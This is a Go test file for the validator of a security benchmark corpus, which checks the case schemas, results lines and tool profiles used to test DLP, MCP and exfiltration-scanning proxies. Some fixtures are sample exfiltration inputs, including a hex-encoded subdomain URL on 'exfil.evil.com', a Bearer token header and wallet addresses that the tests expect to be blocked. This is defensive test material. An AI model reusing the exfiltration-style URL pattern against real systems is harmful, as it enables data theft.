	if len(errors) > 0 {
		t.Errorf("expected no errors for request_body, got: %v", errors)
	}
}

func TestCryptoFinancialCreditCardRequestBodyContract(t *testing.T) {
	path := filepath.Join("..", "cases", "crypto-financial", "crypto-credit-card-006.json")
	raw, err := os.ReadFile(path)
	if os.IsNotExist(err) {
		t.Skip("crypto financial corpus case not found (running outside repo)")
	}
	if err != nil {
		t.Fatal(err)
	}

	var c Case
	if err := json.Unmarshal(raw, &c); err != nil {
		t.Fatalf("unmarshal case: %v", err)
	}
	if c.SchemaVersion != 2 {
		t.Fatalf("schema_version = %d, want 2", c.SchemaVersion)
	}
	if len(c.Requires) != 1 || c.Requires[0] != "crypto_dlp_scanning" {
		t.Fatalf("requires = %v, want [crypto_dlp_scanning]", c.Requires)
	}
	if c.Category != "crypto_financial" || c.InputType != "request_body" || c.Transport != "http_proxy" {
		t.Fatalf("case route = %s/%s/%s, want crypto_financial/request_body/http_proxy", c.Category, c.InputType, c.Transport)
	}

	ids := make(map[string]string)
	if errors := validateFile(path, ids); len(errors) > 0 {
		t.Errorf("expected no errors for crypto financial credit-card request body case, got: %v", errors)
	}
}

func TestCryptoFinancialHTTPProxyHeaderContract(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "crypto-financial", "crypto-header-valid-001.json", `{
		"schema_version": 2, "id": "crypto-header-valid-001", "category": "crypto_financial",
		"title": "T", "description": "D", "input_type": "header",
		"transport": "http_proxy",
		"payload": {"method": "GET", "url": "https://example.com", "headers": {"X-Wallet": "bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4"}},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["crypto_dlp"], "requires": ["crypto_dlp_scanning"],
		"false_positive_risk": "medium", "why_expected": "test",
		"notes": "", "source": "synthetic: crypto header"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "crypto-financial", "crypto-header-valid-001.json")
	if errors := validateFile(path, ids); len(errors) > 0 {
		t.Errorf("expected no errors for crypto financial header http_proxy case, got: %v", errors)
	}
}

func TestCryptoFinancialHTTPProxyRejectsURLInput(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "crypto-financial", "crypto-url-http-proxy-invalid-001.json", `{
		"schema_version": 2, "id": "crypto-url-http-proxy-invalid-001", "category": "crypto_financial",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "http_proxy",
		"payload": {"method": "GET", "url": "https://example.com/?wallet=bc1qw508d6qejxtdg4y5r3zarvary0c5xw7kv8f3t4"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["crypto_dlp"], "requires": ["crypto_dlp_scanning"],
		"false_positive_risk": "medium", "why_expected": "test",
		"notes": "", "source": "synthetic: crypto url"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "crypto-financial", "crypto-url-http-proxy-invalid-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `category "crypto_financial" allows http_proxy only for request_body or header input_type`)
}

func TestHeaderValidPayload(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "headers", "headers-valid-001.json", `{
		"schema_version": 2, "id": "headers-valid-001", "category": "headers",
		"title": "T", "description": "D", "input_type": "header",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com", "headers": {"Authorization": "Bearer secret123"}},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["header_dlp"], "requires": ["header_dlp_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "headers", "headers-valid-001.json")
	errors := validateFile(path, ids)
	if len(errors) > 0 {
		t.Errorf("expected no errors for header payload, got: %v", errors)
	}
}

func TestMCPJsonrpcElementMustBeObject(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-input", "mcp-notobj-001.json", `{
		"schema_version": 2, "id": "mcp-notobj-001", "category": "mcp_input",
		"title": "T", "description": "D", "input_type": "mcp_tool_call",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": [42]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_input_scan"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-input", "mcp-notobj-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "must be an object")
}

func TestMCPJsonrpcElementMissingVersion(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-input", "mcp-noversion-001.json", `{
		"schema_version": 2, "id": "mcp-noversion-001", "category": "mcp_input",
		"title": "T", "description": "D", "input_type": "mcp_tool_call",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": [{"method": "tools/call", "params": {}, "id": 1}]},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_input_scan"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-input", "mcp-noversion-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `missing required field "jsonrpc"`)
}

func TestMCPJsonrpcMessagesNotArray(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "mcp-input", "mcp-notarray-001.json", `{
		"schema_version": 2, "id": "mcp-notarray-001", "category": "mcp_input",
		"title": "T", "description": "D", "input_type": "mcp_tool_call",
		"transport": "mcp_stdio",
		"payload": {"jsonrpc_messages": "not an array"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["mcp_input_scan"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "mcp-input", "mcp-notarray-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "payload.jsonrpc_messages must be an array")
}

func TestAllCategoryTransportCombinations(t *testing.T) {
	// Verify every valid category+transport combo passes
	combos := map[string]struct {
		inputType string
		transport string
		payload   string
	}{
		"url+fetch_proxy":                   {"url", "fetch_proxy", `{"method": "GET", "url": "https://example.com"}`},
		"url+http_proxy":                    {"url", "http_proxy", `{"method": "GET", "url": "https://example.com"}`},
		"url+websocket":                     {"url", "websocket", `{"method": "GET", "url": "https://example.com"}`},
		"request_body+fetch_proxy":          {"request_body", "fetch_proxy", `{"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "data"}`},
		"request_body+http_proxy":           {"request_body", "http_proxy", `{"method": "POST", "url": "https://example.com", "content_type": "application/json", "body": "data"}`},
		"headers+fetch_proxy":               {"header", "fetch_proxy", `{"method": "GET", "url": "https://example.com", "headers": {"X-Key": "val"}}`},
		"response_fetch+fetch_proxy":        {"response_content", "fetch_proxy", `{"url": "https://example.com", "response_body": "hello"}`},
		"response_mitm+http_proxy":          {"response_content", "http_proxy", `{"url": "https://example.com", "response_body": "hello"}`},
		"mcp_input+mcp_stdio":               {"mcp_tool_call", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
		"mcp_input+mcp_http":                {"mcp_tool_call", "mcp_http", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
		"mcp_tool+mcp_stdio":                {"mcp_tool_result", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "result": {}, "id": 1}]}`},
		"mcp_chain+mcp_stdio":               {"mcp_tool_sequence", "mcp_stdio", `{"jsonrpc_messages": [{"jsonrpc": "2.0", "method": "tools/call", "params": {}, "id": 1}]}`},
		"hostname_exfiltration+fetch_proxy": {"url", "fetch_proxy", `{"method": "GET", "url": "https://7365637265743132.exfil.evil.com/"}`},
		"hostname_exfiltration+http_proxy":  {"url", "http_proxy", `{"method": "GET", "url": "https://7365637265743132.exfil.evil.com/"}`},
	}

	for name, combo := range combos {
		t.Run(name, func(t *testing.T) {
			dir := t.TempDir()
			// Extract category from name
			category := name[:strings.Index(name, "+")]
			subdir := categoryDir(category)
			id := strings.ReplaceAll(name, "+", "-")
			fname := id + ".json"
			caseJSON := fmt.Sprintf(`{
				"schema_version": 2, "id": %q, "category": %q,
				"title": "T", "description": "D", "input_type": %q,
				"transport": %q,
				"payload": %s,
				"expected_verdict": "block", "severity": "high",
				"capability_tags": ["url_dlp"], "requires": [],
				"false_positive_risk": "low", "why_expected": "test",
				"notes": "", "source": "original"
			}`, id, category, combo.inputType, combo.transport, combo.payload)
			writeCase(t, dir, subdir, fname, caseJSON)
			ids := make(map[string]string)
			path := filepath.Join(dir, subdir, fname)
			errors := validateFile(path, ids)
			if len(errors) > 0 {
				t.Errorf("expected valid combo %s, got errors: %v", name, errors)
			}
		})
	}
}

func TestSafeExampleFalseOnBenignCase(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-safeFalse-001.json", `{
		"schema_version": 2, "id": "url-safeFalse-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "allow", "severity": "low",
		"capability_tags": ["benign"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"safe_example": false,
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-safeFalse-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "safe_example")
}

func TestMultipleValidationErrors(t *testing.T) {
	// A case with many issues should report all of them
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-multi-001.json", `{
		"schema_version": 0,
		"id": "url-multi-001", "category": "invalid_cat",
		"title": "", "description": "", "input_type": "bad_type",
		"transport": "carrier_pigeon",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "maybe", "severity": "ultra",
		"capability_tags": [], "requires": [],
		"false_positive_risk": "extreme", "why_expected": "",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-multi-001.json")
	errors := validateFile(path, ids)

	// Should have at least 8 errors: schema_version, title, description, why_expected,
	// category, input_type, transport, verdict, severity, fp_risk, capability_tags
	if len(errors) < 8 {
		t.Errorf("expected at least 8 errors, got %d: %v", len(errors), errors)
	}
}

func TestResponseContentPayloadMissingResponseBody(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "response-fetch", "response-fetch-nobody-001.json", `{
		"schema_version": 2, "id": "response-fetch-nobody-001", "category": "response_fetch",
		"title": "T", "description": "D", "input_type": "response_content",
		"transport": "fetch_proxy",
		"payload": {"url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "response-fetch", "response-fetch-nobody-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `payload missing required key "response_body"`)
}

func TestResponseContentPayloadMissingURL(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "response-fetch", "response-fetch-nourl-001.json", `{
		"schema_version": 2, "id": "response-fetch-nourl-001", "category": "response_fetch",
		"title": "T", "description": "D", "input_type": "response_content",
		"transport": "fetch_proxy",
		"payload": {"response_body": "test"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["response_injection"], "requires": ["response_prompt_injection_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "response-fetch", "response-fetch-nourl-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `payload missing required key "url"`)
}

func TestRequestBodyPayloadMissingContentType(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "request-body", "request-body-noct-001.json", `{
		"schema_version": 2, "id": "request-body-noct-001", "category": "request_body",
		"title": "T", "description": "D", "input_type": "request_body",
		"transport": "fetch_proxy",
		"payload": {"method": "POST", "url": "https://example.com", "body": "data"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["request_body_dlp"], "requires": ["request_body_dlp_scanning"],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "request-body", "request-body-noct-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, `payload missing required key "content_type"`)
}

func TestCLIExitCodeOnFailure(t *testing.T) {
	binPath := filepath.Join(t.TempDir(), "validate")
	build := exec.Command("go", "build", "-o", binPath, ".")
	build.Dir = "."
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build failed: %v\n%s", err, out)
	}

	// Run against an empty directory (no cases)
	emptyDir := t.TempDir()
	cmd := exec.Command(binPath, emptyDir)
	output, err := cmd.CombinedOutput()
	if err == nil {
		t.Fatal("expected non-zero exit code for empty directory")
	}
	if !containsStr(string(output), "no case files found") {
		t.Errorf("expected 'no case files found' message, got: %s", output)
	}
}

func TestCLISuccessOnValidCases(t *testing.T) {
	binPath := filepath.Join(t.TempDir(), "validate")
	build := exec.Command("go", "build", "-o", binPath, ".")
	build.Dir = "."
	if out, err := build.CombinedOutput(); err != nil {
		t.Fatalf("build failed: %v\n%s", err, out)
	}

	// Create a valid case
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-cli-001.json", `{
		"schema_version": 2, "id": "url-cli-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": ""
	}`)

	cmd := exec.Command(binPath, dir)
	output, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("expected zero exit code, got error: %v\n%s", err, output)
	}
	if !containsStr(string(output), "validated 1 case") {
		t.Errorf("expected success message, got: %s", output)
	}
}

func TestAllExistingCasesValid(t *testing.T) {
	// Validate the actual corpus to make sure the validator doesn't break real cases.
	casesDir := "../cases"
	if _, err := os.Stat(casesDir); os.IsNotExist(err) {
		t.Skip("cases directory not found (running outside repo)")
	}

	ids := make(map[string]string)
	var allErrors []string

	err := filepath.Walk(casesDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		// Skip multi-file case directories — they have their own schema.
		if info.IsDir() && isMultiFileCaseDir(info.Name()) {
			return filepath.SkipDir
		}
		if info.IsDir() || filepath.Ext(info.Name()) != ".json" {
			return nil
		}
		fileErrors := validateFile(path, ids)
		allErrors = append(allErrors, fileErrors...)
		return nil
	})
	if err != nil {
		t.Fatalf("walk error: %v", err)
	}
	if len(allErrors) > 0 {
		for _, e := range allErrors {
			t.Errorf("validation error: %s", e)
		}
	}
}

// assertContainsError checks that at least one error contains the substring.
func assertContainsError(t *testing.T, errors []string, substr string) {
	t.Helper()
	if len(errors) == 0 {
		t.Fatalf("expected error containing %q, got no errors", substr)
	}
	for _, e := range errors {
		if containsStr(e, substr) {
			return
		}
	}
	t.Errorf("expected error containing %q, got: %v", substr, errors)
}

// categoryDir maps category names to directory names for test setup.
func categoryDir(category string) string {
	dirs := map[string]string{
		"url": "url", "request_body": "request-body", "headers": "headers",
		"response_fetch": "response-fetch", "response_mitm": "response-mitm",
		"mcp_input": "mcp-input", "mcp_tool": "mcp-tool", "mcp_chain": "mcp-chain",
		"hostname_exfiltration": "hostname-exfiltration",
	}
	return dirs[category]
}

func containsStr(s, substr string) bool {
	return len(s) >= len(substr) && searchStr(s, substr)
}

func searchStr(s, substr string) bool {
	for i := 0; i <= len(s)-len(substr); i++ {
		if s[i:i+len(substr)] == substr {
			return true
		}
	}
	return false
}

// strPtr returns a pointer to a string value.
func strPtr(s string) *string { return &s }

// allSupportsKeys returns a supports map with all required keys set to false.
func allSupportsKeys() map[string]interface{} {
	return map[string]interface{}{
		"fetch_proxy": false, "http_proxy": false, "mcp_stdio": false,
		"mcp_http": false, "websocket": false, "a2a": false,
		"tls_interception": false,
		"url_dlp_scanning": false, "request_body_dlp_scanning": false,
		"header_dlp_scanning": false, "response_prompt_injection_scanning": false,
		"mcp_input_dlp_scanning": false, "mcp_input_prompt_injection_scanning": false,
		"mcp_tool_policy": false, "mcp_tool_result_prompt_injection_scanning": false,
		"mcp_tool_poison_scanning": false, "mcp_tool_baseline": false,
		"mcp_chain_memory":                    false,
		"mcp_cross_server_chain_memory":       false,
		"mcp_data_class_labels":               false,
		"a2a_dlp_scanning":                    false,
		"a2a_prompt_injection_scanning":       false,
		"a2a_card_prompt_injection_scanning":  false,
		"a2a_card_drift_scanning":             false,
		"a2a_ssrf_scanning":                   false,
		"websocket_dlp_scanning":              false,
		"websocket_prompt_injection_scanning": false,
		"ssrf_scanning":                       false,
		"ssrf_bypass_scanning":                false,
		"domain_blocklist":                    false,
		"entropy_scanning":                    false,
		"encoding_evasion_scanning":           false,
		"shell_analysis":                      false,
		"crypto_dlp_scanning":                 false,
		"hostname_exfil_scanning":             false,
		"dns_rebinding_fixture":               false,
		"budget_enforcement":                  false,
	}
}

// --- Result validation tests ---

func TestResultValidation_ValidLine(t *testing.T) {
	r := ResultLine{
		CaseID: "test-001", Tool: "test", ToolVersion: "1.0",
		ExpectedVerdict: "block", ActualVerdict: "block", Score: "pass",
		Evidence: map[string]interface{}{"status": float64(403)}, Notes: strPtr(""),
	}
	errors := validateResultLine(1, r)
	if len(errors) != 0 {
		t.Fatalf("expected no errors, got: %v", errors)
	}
}

func TestResultValidation_MissingFields(t *testing.T) {
	r := ResultLine{} // all empty
	errors := validateResultLine(1, r)
	if len(errors) < 3 {
		t.Fatalf("expected multiple errors for empty result line, got %d", len(errors))
	}
}

func TestResultValidation_InconsistentScore(t *testing.T) {
	tests := []struct {
		name     string
		actual   string
		expected string
		score    string
		wantErr  bool
	}{
		{"match should be pass", "block", "block", "pass", false},
		{"match but fail", "block", "block", "fail", true},
		{"match but budget timing fail", "block", "block", "fail", false},
		{"match but bare timing no budget id", "block", "block", "fail", true},
		{"na verdict na score", "not_applicable", "block", "not_applicable", false},
		{"na verdict wrong score", "not_applicable", "block", "pass", true},
		{"error verdict error score", "error", "block", "error", false},
		{"error verdict wrong score", "error", "block", "pass", true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			r := ResultLine{
				CaseID: "t", Tool: "t", ToolVersion: "1",
				ExpectedVerdict: tt.expected, ActualVerdict: tt.actual, Score: tt.score,
				Evidence: map[string]interface{}{}, Notes: strPtr(""),
			}
			if strings.Contains(tt.name, "budget timing") {
				// A genuine budget-enforcement result carries over_budget_call_id
				// alongside before-over-budget timing.
				r.Evidence["budget_block_timing"] = "before_over_budget"
				r.Evidence["over_budget_call_id"] = float64(4)
			}
			if strings.Contains(tt.name, "bare timing") {
				// Timing evidence without the budget id must NOT bypass the
				// matching-verdict-must-pass rule.
				r.Evidence["budget_block_timing"] = "before_over_budget"
			}
			errors := validateResultLine(1, r)
			hasErr := len(errors) > 0
			if hasErr != tt.wantErr {
				t.Errorf("wantErr=%v but got errors: %v", tt.wantErr, errors)
			}
		})
	}
}

func TestResultValidation_DuplicateCaseId(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "results.jsonl")
	lines := `{"case_id":"a","tool":"t","tool_version":"1","expected_verdict":"block","actual_verdict":"block","score":"pass","evidence":{},"notes":""}
{"case_id":"a","tool":"t","tool_version":"1","expected_verdict":"block","actual_verdict":"allow","score":"fail","evidence":{},"notes":""}`
	if err := os.WriteFile(path, []byte(lines), 0o600); err != nil {
		t.Fatal(err)
	}

	errors := validateResultsFile(path)
	found := false
	for _, e := range errors {
		if strings.Contains(e, "duplicate case_id") {
			found = true
		}
	}
	if !found {
		t.Fatal("expected duplicate case_id error")
	}
}

func TestResultValidation_EmptyFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "empty.jsonl")
	if err := os.WriteFile(path, []byte(""), 0o600); err != nil {
		t.Fatal(err)
	}

	errors := validateResultsFile(path)
	if len(errors) == 0 {
		t.Fatal("expected error for empty file")
	}
}

// --- Profile validation tests ---

func TestProfileValidation_Valid(t *testing.T) {
	sup := allSupportsKeys()
	sup["fetch_proxy"] = true
	p := Profile{
		SchemaVersion: 1, Tool: "test", ToolVersion: "1.0", RunnerVersion: "v1",
		Claims:   []string{"url_dlp", "ssrf"},
		Supports: sup,
	}
	errors := validateProfile(p)
	if len(errors) != 0 {
		t.Fatalf("expected no errors, got: %v", errors)
	}
}

func TestProfileValidation_InvalidClaims(t *testing.T) {
	p := Profile{
		SchemaVersion: 1, Tool: "test", ToolVersion: "1.0", RunnerVersion: "v1",
		Claims:   []string{"url_dlp", "not_a_real_claim"},
		Supports: allSupportsKeys(),
	}
	errors := validateProfile(p)
	found := false
	for _, e := range errors {
		if strings.Contains(e, "invalid claim") {
			found = true
		}
	}
	if !found {
		t.Fatal("expected invalid claim error")
	}
}

func TestProfileValidation_MissingFields(t *testing.T) {
	p := Profile{} // all empty/zero
	errors := validateProfile(p)
	if len(errors) < 4 {
		t.Fatalf("expected multiple errors for empty profile, got %d: %v", len(errors), errors)
	}
}

func TestProfileValidation_InvalidSupportsKey(t *testing.T) {
	sup := allSupportsKeys()
	sup["fake_key"] = true
	p := Profile{
		SchemaVersion: 1, Tool: "test", ToolVersion: "1.0", RunnerVersion: "v1",
		Claims:   []string{"url_dlp"},
		Supports: sup,
	}
	errors := validateProfile(p)
	found := false
	for _, e := range errors {
		if strings.Contains(e, "invalid supports key") {
			found = true
		}
	}
	if !found {
		t.Fatal("expected invalid supports key error")
	}
}

func TestProfileValidation_NonBooleanSupports(t *testing.T) {
	sup := allSupportsKeys()
	sup["fetch_proxy"] = "yes"
	p := Profile{
		SchemaVersion: 1, Tool: "test", ToolVersion: "1.0", RunnerVersion: "v1",
		Claims:   []string{"url_dlp"},
		Supports: sup,
	}
	errors := validateProfile(p)
	found := false
	for _, e := range errors {
		if strings.Contains(e, "must be a boolean") {
			found = true
		}
	}
	if !found {
		t.Fatal("expected boolean error for supports value")
	}
}

func TestProfileValidation_File(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "profile.json")
	data, err := json.Marshal(Profile{
		SchemaVersion: 1,
		Tool:          "test",
		ToolVersion:   "1.0",
		RunnerVersion: "v1",
		Claims:        []string{"url_dlp"},
		Supports:      allSupportsKeys(),
	})
	if err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(path, data, 0o600)

	errors := validateProfileFile(path)
	if len(errors) != 0 {
		t.Fatalf("expected no errors, got: %v", errors)
	}
}

// --- Regression tests for unknown fields and missing required fields ---

func TestCaseValidation_RejectsUnknownFields(t *testing.T) {
	dir := t.TempDir()
	writeCase(t, dir, "url", "url-extra-001.json", `{
		"schema_version": 2, "id": "url-extra-001", "category": "url",
		"title": "T", "description": "D", "input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com"},
		"expected_verdict": "block", "severity": "high",
		"capability_tags": ["url_dlp"], "requires": [],
		"false_positive_risk": "low", "why_expected": "test",
		"notes": "", "source": "",
		"bogus_field": "should fail"
	}`)

	ids := make(map[string]string)
	path := filepath.Join(dir, "url", "url-extra-001.json")
	errors := validateFile(path, ids)
	assertContainsError(t, errors, "unknown field")
}

func TestResultValidation_RejectsUnknownFields(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "results.jsonl")
	line := `{"case_id":"t","tool":"t","tool_version":"1","expected_verdict":"block","actual_verdict":"block","score":"pass","evidence":{},"notes":"","extra":"bad"}`
	_ = os.WriteFile(path, []byte(line+"\n"), 0o600)

	errors := validateResultsFile(path)
	assertContainsError(t, errors, "unknown field")
}

func TestResultValidation_MissingNotes(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "results.jsonl")
	line := `{"case_id":"t","tool":"t","tool_version":"1","expected_verdict":"block","actual_verdict":"block","score":"pass","evidence":{}}`
	_ = os.WriteFile(path, []byte(line+"\n"), 0o600)

	errors := validateResultsFile(path)
	assertContainsError(t, errors, "missing notes")
}

func TestResultValidation_BlankOnlyFile(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "blank.jsonl")
	_ = os.WriteFile(path, []byte("\n\n\n"), 0o600)

	errors := validateResultsFile(path)
	assertContainsError(t, errors, "no result lines")
}

func TestProfileValidation_MissingSupportsKeys(t *testing.T) {
	p := Profile{
		SchemaVersion: 1, Tool: "test", ToolVersion: "1.0", RunnerVersion: "v1",
		Claims:   []string{"url_dlp"},
		Supports: map[string]interface{}{"fetch_proxy": true},
	}
	errors := validateProfile(p)
	assertContainsError(t, errors, "missing required supports key")
}

func TestProfileValidation_RejectsUnknownFields(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "profile.json")
	raw := map[string]interface{}{
		"schema_version": 1,
		"tool":           "test",
		"tool_version":   "1.0",
		"runner_version": "v1",
		"claims":         []string{"url_dlp"},
		"supports":       allSupportsKeys(),
		"bogus":          true,
	}
	data, err := json.Marshal(raw)
	if err != nil {
		t.Fatal(err)
	}
	_ = os.WriteFile(path, data, 0o600)

	errors := validateProfileFile(path)
	assertContainsError(t, errors, "unknown field")
}

// caseWithRequires renders a minimal valid single-file case carrying the given
// requires array, so a test can vary requires and nothing else.
func caseWithRequires(requires string) string {
	return fmt.Sprintf(`{
		"schema_version": 2,
		"id": "url-test-001",
		"category": "url",
		"title": "Test URL case",
		"description": "Valid URL test case",
		"input_type": "url",
		"transport": "fetch_proxy",
		"payload": {"method": "GET", "url": "https://example.com/test"},
		"expected_verdict": "block",
		"severity": "high",
		"capability_tags": ["url_dlp"],
		"requires": %s,
		"false_positive_risk": "low",
		"why_expected": "test_reason",
		"notes": "",
		"source": ""
	}`, requires)
}

// Attack-difficulty flags describe how hard an input is on a surface the tool
// already inspects. Letting one gate applicability would let a tool dodge the
// hard variant by declining the claim, so requires must reject them on every
// case shape. This test covers the single-file JSON shape.
func TestRequiresRejectsDifficultyFlags(t *testing.T) {
	for _, flag := range []string{"encoding_evasion_scanning", "ssrf_bypass_scanning"} {
		t.Run(flag, func(t *testing.T) {
			dir := t.TempDir()
			path := writeCase(t, dir, "url", "url-test-001.json",
				caseWithRequires(fmt.Sprintf(`["%s"]`, flag)))

			errors := validateFile(path, make(map[string]string))
			assertContainsError(t, errors, "attack-difficulty flag")
		})
	}
}

// Enforcement claims name the feature under test. Gating on one lets a tool
// delete both the attack cases and the benign control that measures its
// over-blocking, which is what budget_enforcement did to the denial-of-wallet
// family. Rejecting the token closes the class, not just the instance the
// corpus happened to contain.
func TestRequiresRejectsEnforcementClaims(t *testing.T) {
	dir := t.TempDir()
	path := writeCase(t, dir, "url", "url-test-001.json",
		caseWithRequires(`["budget_enforcement"]`))

	errors := validateFile(path, make(map[string]string))
	assertContainsError(t, errors, "enforcement claim")
}

// The same token must stay a valid supports key: a tool may legitimately
// declare that it enforces budgets, and that claim is reported. Only its use as
// an applicability gate is banned.
func TestEnforcementClaimRemainsAValidSupportsKey(t *testing.T) {
	if !validSupportsKeys["budget_enforcement"] {
		t.Error("budget_enforcement must remain a valid supports key; only its use in requires is rejected")
	}
}

// Positive control for the test above: a legitimate runtime prerequisite in the
// same field must still pass, so the guard is proven to reject the flag rather
// than to reject requires in general.
func TestRequiresAcceptsRuntimePrerequisite(t *testing.T) {
	dir := t.TempDir()
	path := writeCase(t, dir, "url", "url-test-001.json",
		caseWithRequires(`["tls_interception"]`))

	if errors := validateFile(path, make(map[string]string)); len(errors) > 0 {
		t.Errorf("expected no errors for a valid requires entry, got: %v", errors)
	}
}

// The multi-file case shape (case.yaml) is a second door into the same
// applicability rules. Before this guard existed the loader read requires from
// case.yaml and no validator ever saw it, so the single-file guard above was
// bypassable by authoring the case in the multi-file shape.
func TestMultiFileRequiresValidation(t *testing.T) {
	const header = "schema_version: 1\nid: mcp-drift-test-001\n"

	tests := []struct {
		name    string
		yaml    string
		wantErr string
	}{
		{
			name:    "difficulty flag in block form",
			yaml:    header + "requires:\n  - mcp_tool_baseline\n  - encoding_evasion_scanning\n",
			wantErr: "attack-difficulty flag",
		},
		{
			name:    "difficulty flag in inline form",
			yaml:    header + "requires: [mcp_tool_baseline, ssrf_bypass_scanning]\n",
			wantErr: "attack-difficulty flag",
		},
		{
			name:    "enforcement claim in block form",
			yaml:    header + "requires:\n  - budget_enforcement\n",
			wantErr: "enforcement claim",
		},
		// A multi-line flow sequence is valid YAML. The previous parser saw
		// "requires: [", trimmed it to nothing, and reported an empty list, so
		// every token on the following lines was accepted unexamined. That made
		// the multi-file shape a working bypass of the whole applicability rule
		// set rather than a second door onto it.
		{
			name:    "multi-line flow sequence is rejected, not read as empty",
			yaml:    header + "requires: [\n  mcp_tool_baseline,\n  encoding_evasion_scanning\n]\n",
			wantErr: "multi-line flow sequence",
		},
		{
			name:    "scalar requires is rejected",
			yaml:    header + "requires: mcp_tool_baseline\n",
			wantErr: "must be a list",
		},
		{
			name:    "mapping under requires is rejected",
			yaml:    header + "requires:\n  nested:\n    - mcp_tool_baseline\n",
			wantErr: "expected a list entry",
		},
		{
			name:    "unterminated quote is rejected",
			yaml:    header + "requires: [\"mcp_tool_baseline]\n",
			wantErr: "unterminated quote",
		},
		// Availability matters as much as the bypass: a trailing comment on an
		// inline sequence is ordinary YAML, and rejecting it would push authors
		// toward the shapes this validator handles worst.
		{
			name: "inline sequence with a trailing comment is accepted",
			yaml: header + "requires: [mcp_tool_baseline] # rationale\n",
		},
		{
			name: "quoted tokens are accepted",
			yaml: header + "requires: [\"mcp_tool_baseline\", 'mcp_chain_memory']\n",
		},
		{
			name: "empty flow sequence is accepted",
			yaml: header + "requires: []\n",
